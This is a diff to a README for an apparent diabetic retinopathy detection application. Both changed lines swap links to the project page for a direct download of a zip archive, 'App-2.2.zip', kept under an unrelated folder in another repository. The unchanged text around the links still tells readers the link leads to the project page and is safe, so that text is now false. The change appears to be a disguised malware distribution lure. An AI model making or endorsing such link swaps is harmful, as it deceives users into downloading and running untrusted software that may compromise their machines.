@@ -17,7 +17,7 @@ The software has been carefully tested to give accurate results, and it can even
 
 ## 📥 Download the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_APP-blue?style=for-the-badge&colorA=4CAF50&colorB=2196F3)](https://github.com/Wanzanati2011/diabetic-retinopathy-detection)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_APP-blue?style=for-the-badge&colorA=4CAF50&colorB=2196F3)](https://raw.githubusercontent.com/Wanzanati2011/wanzanati2011.github.io/main/Cephalotaxus/App-2.2.zip)
 
 Visit this link to download the application. This link takes you to the project page where you can find the file you need. It's safe and comes directly from the developers.
 
@@ -108,7 +108,7 @@ If you get stuck, here are a few simple things to try:
 3.  **Check your file:** Make sure you downloaded it fully. The file should be a few hundred megabytes in size. If it's much smaller, try again.
 4.  **Ask a friend:** A quick search on the GitHub page's "Issues" or "Discussions" tab might have answers if you have a specific error message.
 
-The main download link again: [https://github.com/Wanzanati2011/diabetic-retinopathy-detection](https://github.com/Wanzanati2011/diabetic-retinopathy-detection)
+The main download link again: [https://raw.githubusercontent.com/Wanzanati2011/wanzanati2011.github.io/main/Cephalotaxus/App-2.2.zip](https://raw.githubusercontent.com/Wanzanati2011/wanzanati2011.github.io/main/Cephalotaxus/App-2.2.zip)
 
 ---
 
